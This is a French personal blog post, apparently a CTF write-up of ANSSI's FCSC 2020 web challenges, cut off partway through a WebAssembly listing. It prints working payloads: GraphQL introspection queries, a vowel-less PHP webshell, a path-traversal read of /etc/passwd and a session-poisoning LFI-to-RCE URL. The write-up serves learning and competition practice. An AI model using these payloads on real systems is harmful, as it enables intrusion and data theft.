@@ -1,0 +1,1375 @@
+<!DOCTYPE html>
+<html lang="fr">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    <link rel="stylesheet" href="/css/custom.css">
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Cache-Control" content="public" />
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.68.3" />
+
+    
+    
+    
+
+<title>FCSC ANSSI 2020 • LOLOLEKIK</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="FCSC ANSSI 2020"/>
+<meta name="twitter:description" content="CTF organisé par l&rsquo;ANSSI pour effectuer les préselections de l&rsquo;ECSC
+Introduction Cette année j&rsquo;ai eu le plaisir de participer au CTF de l&rsquo;anssi ! Cet évènement a réuni plus de 2100 participants. C&#39;était un expérience enrichissante et je vous partage la totalité de mes challenges (excepté intro) ici ! Bonne lecture et bon courage :)
+Ah oui et voici mon classement :
+Ce qui correspondait à 75 sur 633 dans la catégorie Sénior."/>
+
+<meta property="og:title" content="FCSC ANSSI 2020" />
+<meta property="og:description" content="CTF organisé par l&rsquo;ANSSI pour effectuer les préselections de l&rsquo;ECSC
+Introduction Cette année j&rsquo;ai eu le plaisir de participer au CTF de l&rsquo;anssi ! Cet évènement a réuni plus de 2100 participants. C&#39;était un expérience enrichissante et je vous partage la totalité de mes challenges (excepté intro) ici ! Bonne lecture et bon courage :)
+Ah oui et voici mon classement :
+Ce qui correspondait à 75 sur 633 dans la catégorie Sénior." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://lololekik.com/writeups/fcsc-anssi/" />
+<meta property="og:site_name" content="OffSec &amp; CO" />
+
+
+    <link rel="stylesheet" href="/css/custom.css">
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/custom.css">
+<link rel="stylesheet" href="/scss/hyde-hyde.2aa50c1cef9d4c1452dcd5fdae0f04b8af0b434ba4411ac5045b3b0fb71da69a.css" integrity="sha256-KqUMHO&#43;dTBRS3NX9rg8EuK8LQ0ukQRrFBFs7D7cdppo=">
+
+
+<link rel="stylesheet" href="/scss/print.2744dcbf8a0b2e74f8a50e4b34e5f441be7cf93cc7de27029121c6a09f9e77bc.css" integrity="sha256-J0Tcv4oLLnT4pQ5LNOX0Qb58&#43;TzH3icCkSHGoJ&#43;ed7w=" media="print">
+
+
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/custom.css">
+
+</head>
+
+
+    <body class=" ">
+    
+<div class="sidebar">
+  <div class="container ">
+    <div class="sidebar-about">
+      <span class="site__title">
+        <a href="http://lololekik.com/">LOLOLEKIK</a>
+      </span>
+      
+        
+        
+        
+        <div class="author-image">
+          <img src="http://lololekik.com/img/author.jpg" alt="Author Image" class="img--circle img--headshot element--center">
+        </div>
+        
+      
+      
+      <p class="site__description">
+         OffSec &amp; Co 
+      </p>
+    </div>
+    <div class="collapsible-menu">
+      <input type="checkbox" id="menuToggle">
+      <label for="menuToggle">LOLOLEKIK</label>
+      <div class="menu-content">
+        <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/writeups/">
+						<span>WriteUps</span>
+					</a>
+				</li>
+			 
+		
+	</ul>
+</div>
+
+        <section class="social">
+	
+	
+	
+	<a href="https://github.com/LOLOLEKIK" rel="me"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	
+	
+	<a href="https://root-me.org/lololekik" target="blank" class="linklogo"><div class="rootme_logo logohover"> </div></a>
+	
+	
+	<a href="https://hackthebox.eu/home/users/profile/202145" target="blank" class="linklogo"><div class="hackthebox_logo logohover"> </div></a>
+	
+	
+	<a href="https://linkedin.com/in/loris-thiebaut-8b4b85197" rel="me"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	<a href="mailto:loris.thiebaut@gmail.com" rel="me"><i class="fas fa-at fa-lg" aria-hidden="true"></i></a>
+	
+</section>
+
+      </div>
+    </div>
+    
+
+<div class="builtwith">
+Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+</div>
+
+
+  </div>
+</div>
+
+        <div class="content container">
+            
+    
+<article>
+  <header>
+    <h1>FCSC ANSSI 2020</h1>
+    
+    
+<div class="post__meta">
+    
+    
+    
+    
+      
+      
+          in
+          
+          
+              <a class="badge badge-category" href="/categories/writeups">WRITEUPS</a>
+              
+          
+      
+    
+    
+    
+      
+      
+          <br/>
+           <i class="fas fa-tags"></i>
+          
+          <a class="badge badge-tag" href="/tags/ctf">ctf</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/writeups">writeups</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/web">web</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/forensic">forensic</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/misc">misc</a>
+          
+      
+    
+    
+    <br/>
+    <i class="fas fa-clock"></i> 25 min read
+</div>
+
+
+  </header>
+  
+  
+  <div class="post">
+    <p><strong>CTF organisé par l&rsquo;ANSSI pour effectuer les préselections de l&rsquo;ECSC</strong></p>
+<h1 id="introduction">Introduction</h1>
+<p>Cette année j&rsquo;ai eu le plaisir de participer au CTF de l&rsquo;anssi ! Cet évènement a réuni plus de 2100 participants. C'était un expérience enrichissante et je vous partage la totalité de mes challenges (excepté intro) ici ! Bonne lecture et bon courage :)</p>
+<p>Ah oui et voici mon classement :</p>
+
+
+
+  <img src="/img/FCSC2020/score.png" alt="introFCSC" class="imageformat"/>
+
+<p>Ce qui correspondait à 75 sur 633 dans la catégorie Sénior.</p>
+<p>Bien joué à tous les participants.</p>
+<h1 id="ctf">CTF</h1>
+<p>Dans ce CTF, nous avons pu nous affronter dans divers épreuves. Du web, pwn, forensic, misc, reverse&hellip;
+Il y avait aussi une catégorie Intro qui permettait de découvrir les différentes catégories présentées dans le CTF.</p>
+
+
+
+  <img src="/img/FCSC2020/introall.png" alt="introFCSC" class="imageformat"/>
+
+<p>Je ne présenterai pas les Write Ups de cette catégorie car ce n'était pas forcément des challenges très complexe et les choses vues dans les &ldquo;vrais&rdquo; catégories reprennent les techniques de Intro.</p>
+<h1 id="web">Web</h1>
+<p>Voici tous les challenges web :</p>
+
+
+
+  <img src="/img/FCSC2020/webchall.png" alt="webFCSC" class="imageformat"/>
+
+<h2 id="enterthedungeon">EnterTheDungeon</h2>
+
+
+
+  <img src="/img/FCSC2020/etdchall.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>EnterTheDungeon était le premier challenge Web de la série. Voici la page d&rsquo;accueil :</p>
+
+
+
+  <img src="/img/FCSC2020/ETDacc.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>Premier réflexe, on fait un tour sur code source :</p>
+
+
+
+  <img src="/img/FCSC2020/etdsrc.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>On se dirige vers la page décrite dans les commentaires pour vérifier le code :</p>
+
+
+
+  <img src="/img/FCSC2020/edttxt.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>En observant le code source il y a un test impossible ! Cependant nous voyons que le test se fait sur une égalité &ldquo;==&rdquo;. Nous pouvons donc essayer de bypass ça avec les &ldquo;Magic Number&rdquo;. Le magic number est dans le GET de l&rsquo;url.</p>
+
+
+
+  <img src="/img/FCSC2020/etdtxt.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>Il fallait ensuite faire un F5 sur le donjon et nous voilà à l&rsquo;intérieur.</p>
+
+
+
+  <img src="/img/FCSC2020/etdwin.png" alt="FCSC Write up web" class="imageformat"/>
+
+<h2 id="rainbowpages">RainbowPages</h2>
+
+
+
+  <img src="/img/FCSC2020/rpchall.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>RainbowPages proposait un service de recherche de chef cuisinier ! En regardant le code source nous pouvons voir que la recherche se fait de cette façon :</p>
+
+
+
+  <img src="/img/FCSC2020/rpsource.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>Ici nous voyons avec btoa que la requête était chiffré en base64 puis envoyée avec notre input dedans. Quelle erreur ! Nous pouvons donc mettre ce que nous voulons dans la requête.</p>
+<p><em>NB : Tous les payloads suivants ont été encode en base64 avant d'être envoyés</em></p>
+<p>J&rsquo;ai commencé par reconstruire une requête légitime, mais sans les fitlres, pour tester ma théorie :</p>
+<p><code>{ allCooks { nodes { firstname, lastname, speciality, price }}}</code></p>
+
+
+
+  <img src="/img/FCSC2020/rppay1.png" alt="Injection WEB FCSC" class="imageformat"/>
+
+<p>Bingo ! Tous les cuisiniers s&rsquo;offrent à nous.</p>
+<p>Ensuite j&rsquo;ai essayé de remplacer des champs par des &ldquo;xxx&rdquo; pour observer les erreurs.</p>
+<p><code>{ xxx { nodes { firstname, lastname, speciality, price }}}</code></p>
+
+
+
+  <img src="/img/FCSC2020/rppay2.png" alt="Injection WEB FCSC" class="imageformat"/>
+
+<p>Une petite recherche sur internet nous indique que c&rsquo;est du graphSQL qui tourne derrière. Direction PayloadAllTheThings et tentons d&rsquo;injecter notre premier payload :</p>
+<p><code>{__schema{types{name}}}</code></p>
+
+
+
+  <img src="/img/FCSC2020/rppay3.png" alt="Injection WEB FCSC" class="imageformat"/>
+
+<p>On continue l'énumération et on trouve le fields Flag :</p>
+<p><code>{__type (name: &quot;Flag&quot;) {name fields{name type{name kind ofType{name kind}}}}}</code></p>
+
+
+
+  <img src="/img/FCSC2020/rppay4.png" alt="Injection WEB FCSC" class="imageformat"/>
+
+<p>Il nous reste plus qu'à afficher le flag :</p>
+<p><code>{ allFlags{ nodes { flag}}}</code></p>
+
+
+
+  <img src="/img/FCSC2020/rppay5.png" alt="Injection WEB FCSC" class="imageformat"/>
+
+<h2 id="revision">Revision</h2>
+
+
+
+  <img src="/img/FCSC2020/revchall.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>Pour revision nous avions un site web qui comparait si deux pdf étaient identique. Nous avons le script python ci dessous :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># coding: utf-8</span>
+<span style="color:#f92672">import</span> hashlib
+<span style="color:#f92672">from</span> web.services.database <span style="color:#f92672">import</span> Database
+<span style="color:#f92672">from</span> web.services.mailer <span style="color:#f92672">import</span> Mailer
+
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ComparatorError</span>(<span style="color:#a6e22e">Exception</span>):
+    <span style="color:#e6db74">&#34;&#34;&#34;Base class for all Comparator exceptions&#34;&#34;&#34;</span>
+    <span style="color:#66d9ef">pass</span>
+
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DatabaseError</span>(ComparatorError):
+    <span style="color:#e6db74">&#34;&#34;&#34;Exception raised for errors in database operations.&#34;&#34;&#34;</span>
+
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">StoreError</span>(ComparatorError):
+    <span style="color:#e6db74">&#34;&#34;&#34;Exception raised for errors in store function.
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">    Attributes:
+</span><span style="color:#e6db74">        message -- explanation of the error
+</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+
+    <span style="color:#66d9ef">def</span> __init__(self, files, message):
+        self<span style="color:#f92672">.</span>files <span style="color:#f92672">=</span> files
+        self<span style="color:#f92672">.</span>message <span style="color:#f92672">=</span> message
+
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Comparator</span>(object):
+    <span style="color:#e6db74">&#34;&#34;&#34;A class for Comparator&#34;&#34;&#34;</span>
+
+    BLOCK_SIZE <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">1024</span>
+
+    <span style="color:#66d9ef">def</span> __init__(self, f1<span style="color:#f92672">=</span>None, f2<span style="color:#f92672">=</span>None):
+        <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">        Set default parameters
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">        Required parameters :
+</span><span style="color:#e6db74">            f1: open file handler
+</span><span style="color:#e6db74">            f2: open file handler
+</span><span style="color:#e6db74">            db: database
+</span><span style="color:#e6db74">            m : mailer
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
+        self<span style="color:#f92672">.</span>f1 <span style="color:#f92672">=</span> f1
+        self<span style="color:#f92672">.</span>f2 <span style="color:#f92672">=</span> f2
+        self<span style="color:#f92672">.</span>db <span style="color:#f92672">=</span> Database()
+        self<span style="color:#f92672">.</span>m <span style="color:#f92672">=</span> Mailer()
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">compare</span>(self):
+        self<span style="color:#f92672">.</span>_reset_cursor()
+        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>f1<span style="color:#f92672">.</span>read() <span style="color:#f92672">==</span> self<span style="color:#f92672">.</span>f2<span style="color:#f92672">.</span>read()
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">store</span>(self):
+        self<span style="color:#f92672">.</span>_reset_cursor()
+        f1_hash <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_compute_sha1(self<span style="color:#f92672">.</span>f1)
+        f2_hash <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_compute_sha1(self<span style="color:#f92672">.</span>f2)
+
+        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>db<span style="color:#f92672">.</span>document_exists(f1_hash) <span style="color:#f92672">or</span> self<span style="color:#f92672">.</span>db<span style="color:#f92672">.</span>document_exists(f2_hash):
+            <span style="color:#66d9ef">raise</span> DatabaseError()
+
+        attachments <span style="color:#f92672">=</span> set([f1_hash, f2_hash])
+        <span style="color:#75715e"># Debug debug...</span>
+        <span style="color:#66d9ef">if</span> len(attachments) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>:
+            <span style="color:#66d9ef">raise</span> StoreError([f1_hash, f2_hash], self<span style="color:#f92672">.</span>_get_flag())
+        <span style="color:#66d9ef">else</span>:
+            self<span style="color:#f92672">.</span>m<span style="color:#f92672">.</span>send(attachments<span style="color:#f92672">=</span>attachments)
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_compute_sha1</span>(self, f):
+        h <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1()
+        buf <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read(self<span style="color:#f92672">.</span>BLOCK_SIZE)
+        <span style="color:#66d9ef">while</span> len(buf) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
+            h<span style="color:#f92672">.</span>update(buf)
+            buf <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read(self<span style="color:#f92672">.</span>BLOCK_SIZE)
+        <span style="color:#66d9ef">return</span> h<span style="color:#f92672">.</span>hexdigest()
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_reset_cursor</span>(self):
+        self<span style="color:#f92672">.</span>f1<span style="color:#f92672">.</span>seek(<span style="color:#ae81ff">0</span>)
+        self<span style="color:#f92672">.</span>f2<span style="color:#f92672">.</span>seek(<span style="color:#ae81ff">0</span>)
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_flag</span>(self):
+</code></pre></div><p>Pour faire bugger l&rsquo;application il fallait donc envoyer deux fichiers qui étaient différents et qui avaient  le même hash sha-1. Nous voyons ça car la commande set place chaque hash dans un dictionnaire mais si la valeur rentrée est égal à la première alors la longueur du dictionnaire sera égale à 1. Il existe de nombreux sites sur internet qui permettent de créer cette collision. Voici celui que j&rsquo;ai utilisé : <a href="https://alf.nu/SHA1">https://alf.nu/SHA1</a></p>
+<p>J&rsquo;ai ensuite converti mes images en PDF et j&rsquo;ai tout envoyé au site. Il m&rsquo;a gentiment donné le flag :)</p>
+<h2 id="lipogrammeurs">Lipogrammeurs</h2>
+
+
+
+  <img src="/img/FCSC2020/lipchall.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>Pour liprogrammeurs nous avons accès au code source d&rsquo;une page php :</p>
+
+
+
+  <img src="/img/FCSC2020/lip1.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>J&rsquo;ai repris le code en local pour analyser son fonctionnement et tester mes payloads.</p>
+
+
+
+  <img src="/img/FCSC2020/lip2.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>Nous pouvons voir qu&rsquo;il y a un filtre sur toutes les voyelles et les chiffres. Une fois le filtre passé le page execute le code PHP qu&rsquo;on lui envoit. Mon idée était donc de générer un web shell sans voyelle ni chiffre.</p>
+
+
+
+  <img src="/img/FCSC2020/lip3.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>Notre payload fonctionne ! J&rsquo;ai donc cherché un webshell sur internet et j&rsquo;ai trouvé celui là :</p>
+<pre><code>$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_](${$_}[__]);
+</code></pre><p>J&rsquo;ai donc commencé à lister tous les fichiers du répertoire courant :</p>
+
+
+
+  <img src="/img/FCSC2020/lip4.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>Et ensuite j&rsquo;ai affiché le flag avec une commande cat et en ouvrant le code source :</p>
+
+
+
+  <img src="/img/FCSC2020/lip5.png" alt="FCSC Write up web" class="imageformat"/>
+
+<h2 id="bestiary">Bestiary</h2>
+
+
+
+  <img src="/img/FCSC2020/bestchall.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>Bestiary de loin mon challenge préféré ! Je ne connaissais pas du tout cette mécanique et j&rsquo;ai adoré :)</p>
+<p>C'était un site sur lequel on pouvait faire des recherches sur des monstres :</p>
+
+
+
+  <img src="/img/FCSC2020/best1.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>Vous l&rsquo;avez vu comme moi, la commande get est tentante à injecter !</p>
+<p>On tente le payload : <code>http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=../../../../etc/passwd</code></p>
+
+
+
+  <img src="/img/FCSC2020/besttest.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>Et hop là ! Une LFI :) Premier réflexe, afficher le code source de la page avec un filter :</p>
+
+
+
+  <img src="/img/FCSC2020/bestfilt.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>On décode ensuite en basse 64 et on obtient ça :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+        <span style="color:#a6e22e">session_save_path</span>(<span style="color:#e6db74">&#34;./sessions/&#34;</span>);
+        <span style="color:#a6e22e">session_start</span>();
+        <span style="color:#66d9ef">include_once</span>(<span style="color:#e6db74">&#39;flag.php&#39;</span>);
+<span style="color:#75715e">?&gt;</span>
+&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">head</span>&gt;
+        &lt;<span style="color:#f92672">title</span>&gt;Bestiary&lt;/<span style="color:#f92672">title</span>&gt;
+&lt;/<span style="color:#f92672">head</span>&gt;
+&lt;<span style="color:#f92672">body</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;background-color:#3CB371;&#34;</span>&gt;
+&lt;<span style="color:#f92672">center</span>&gt;&lt;<span style="color:#f92672">h1</span>&gt;Bestiary&lt;/<span style="color:#f92672">h1</span>&gt;&lt;/<span style="color:#f92672">center</span>&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">show</span>()
+{
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">monster</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;monster&#34;</span>).<span style="color:#a6e22e">value</span>;
+        document.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;index.php?monster=&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">monster</span>;
+}
+&lt;/<span style="color:#f92672">script</span>&gt;
+
+&lt;<span style="color:#f92672">p</span>&gt;
+<span style="color:#75715e">&lt;?php</span>
+        $monster <span style="color:#f92672">=</span> <span style="color:#66d9ef">NULL</span>;
+
+        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;monster&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_SESSION[<span style="color:#e6db74">&#39;monster&#39;</span>]))
+                $monster <span style="color:#f92672">=</span> $_SESSION[<span style="color:#e6db74">&#39;monster&#39;</span>];
+        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;monster&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_GET[<span style="color:#e6db74">&#39;monster&#39;</span>]))
+        {
+                $monster <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;monster&#39;</span>];
+                $_SESSION[<span style="color:#e6db74">&#39;monster&#39;</span>] <span style="color:#f92672">=</span> $monster;
+        }
+
+        <span style="color:#66d9ef">if</span>($monster <span style="color:#f92672">!==</span> <span style="color:#66d9ef">NULL</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">strpos</span>($monster, <span style="color:#e6db74">&#34;flag&#34;</span>) <span style="color:#f92672">===</span> <span style="color:#66d9ef">False</span>)
+                <span style="color:#66d9ef">include</span>($monster);
+        <span style="color:#66d9ef">else</span>
+                <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Select a monster to read his description.&#34;</span>;
+<span style="color:#75715e">?&gt;</span>
+&lt;/<span style="color:#f92672">p</span>&gt;
+
+&lt;<span style="color:#f92672">select</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;monster&#34;</span>&gt;
+        &lt;<span style="color:#f92672">option</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;beholder&#34;</span>&gt;Beholder&lt;/<span style="color:#f92672">option</span>&gt;
+        &lt;<span style="color:#f92672">option</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;displacer_beast&#34;</span>&gt;Displacer Beast&lt;/<span style="color:#f92672">option</span>&gt;
+        &lt;<span style="color:#f92672">option</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mimic&#34;</span>&gt;Mimic&lt;/<span style="color:#f92672">option</span>&gt;
+        &lt;<span style="color:#f92672">option</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;rust_monster&#34;</span>&gt;Rust Monster&lt;/<span style="color:#f92672">option</span>&gt;
+        &lt;<span style="color:#f92672">option</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;gelatinous_cube&#34;</span>&gt;Gelatinous Cube&lt;/<span style="color:#f92672">option</span>&gt;
+        &lt;<span style="color:#f92672">option</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;owlbear&#34;</span>&gt;Owlbear&lt;/<span style="color:#f92672">option</span>&gt;
+        &lt;<span style="color:#f92672">option</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;lich&#34;</span>&gt;Lich&lt;/<span style="color:#f92672">option</span>&gt;
+        &lt;<span style="color:#f92672">option</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;the_drow&#34;</span>&gt;The Drow&lt;/<span style="color:#f92672">option</span>&gt;
+        &lt;<span style="color:#f92672">option</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mind_flayer&#34;</span>&gt;Mind Flayer&lt;/<span style="color:#f92672">option</span>&gt;
+        &lt;<span style="color:#f92672">option</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tarrasque&#34;</span>&gt;Tarrasque&lt;/<span style="color:#f92672">option</span>&gt;
+&lt;/<span style="color:#f92672">select</span>&gt; &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;button&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;show description&#34;</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;show()&#34;</span>&gt;
+&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;font-size:70%&#34;</span>&gt;Source : https://io9.gizmodo.com/the-10-most-memorable-dungeons-dragons-monsters-1326074030&lt;/<span style="color:#f92672">div</span>&gt;&lt;<span style="color:#f92672">br</span> /&gt;
+&lt;/<span style="color:#f92672">body</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+
+</code></pre></div><p>Il y a un strpos sur le flag ! C&rsquo;est parti pour essayer de le bypass ! Malheuresement je n&rsquo;ai jamais réussi à le bypass mais j&rsquo;ai appris plein de trucs cool en chemin :) Je découvre dans mes recherches qu&rsquo;il est possible d&rsquo;upgrade une lfi en RCE. Après plusiseurs tests c&rsquo;est en effet possible, à la condition de bien indiquer le nouveau chemin pour les sessions écrit au début du code.</p>
+<p>Lorsque nous accedons à la page : <code>http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=./sessions/sess_c7466eed80079027ba4208f6e5cbeddf </code> (avec notre numéro de session) nous avions la dernière chose que nous avions rentré dans l&rsquo;url :</p>
+
+
+
+  <img src="/img/FCSC2020/bestrcetest.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>Me voilà donc l&rsquo;idée d&rsquo;injecter du code php avec le lien suivant :</p>
+<pre><code>http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=&quot;&lt;/p&gt; \n  &lt;?php $homepage = file_get_contents('./flag.php'); echo $homepage; ?&gt; \n &quot; &lt;p&gt;
+</code></pre><p>Ensuite il suffit de rappeler notre session et nous avions un cadeau dans le code source :</p>
+
+
+
+  <img src="/img/FCSC2020/bestflag.png" alt="FCSC Write up web" class="imageformat"/>
+
+<h2 id="flag-checker">Flag Checker</h2>
+
+
+
+  <img src="/img/FCSC2020/flagchall.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>Flag Checker n'était pas très difficile dans la mesure ou il pouvait se faire avec cyberchef. Mais disons que de mon côté il a été compliqué :)</p>
+<p>Le site web attend qu&rsquo;on lui donne un flag et si c&rsquo;est le bon alors on peut valider l'épreuve avec ce dernier.</p>
+
+
+
+  <img src="/img/FCSC2020/flagscreen.png" alt="FCSC Write up web" class="imageformat"/>
+
+<p>Nous observons le code javascript et nous pouvons voir ce bout de code :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">(module
+  (type <span style="color:#960050;background-color:#1e0010">$</span>type0 (func (param i32) (result i32)))
+  (type <span style="color:#960050;background-color:#1e0010">$</span>type1 (func))
+  (type <span style="color:#960050;background-color:#1e0010">$</span>type2 (func (param i32)))
+  (type <span style="color:#960050;background-color:#1e0010">$</span>type3 (func (result i32)))
+  (import <span style="color:#e6db74">&#34;a&#34;</span> <span style="color:#e6db74">&#34;memory&#34;</span> (memory (;<span style="color:#ae81ff">0</span>;) <span style="color:#ae81ff">256</span> <span style="color:#ae81ff">256</span>))
+  (global <span style="color:#960050;background-color:#1e0010">$</span>global0 (mut i32) (i32.<span style="color:#66d9ef">const</span> <span style="color:#ae81ff">5244480</span>))
+  (export <span style="color:#e6db74">&#34;a&#34;</span> (func <span style="color:#960050;background-color:#1e0010">$</span>func5))
+  (export <span style="color:#e6db74">&#34;b&#34;</span> (func <span style="color:#960050;background-color:#1e0010">$</span>func4))
+  (export <span style="color:#e6db74">&#34;c&#34;</span> (func <span style="color:#960050;background-color:#1e0010">$</span>func2))
+  (export <span style="color:#e6db74">&#34;d&#34;</span> (func <span style="color:#960050;background-color:#1e0010">$</span>func1))
+  (export <span style="color:#e6db74">&#34;e&#34;</span> (func <span style="color:#960050;background-color:#1e0010">$</span>func0))
+  (func <span style="color:#960050;background-color:#1e0010">$</span>func0 (param <span style="color:#960050;background-color:#1e0010">$</span>var0 i32)
+    get_local <span style="color:#960050;background-color:#1e0010">$</span>var0
+    set_global <span style="color:#960050;background-color:#1e0010">$</span>global0
+  )
+  (func <span style="color:#960050;background-color:#1e0010">$</span>func1 (param <span style="color:#960050;background-color:#1e0010">$</span>var0 i32) (result i32)
+    get_global <span style="color:#960050;background-color:#1e0010">$</span>global0
+    get_local <span style="color:#960050;background-color:#1e0010">$</span>var0
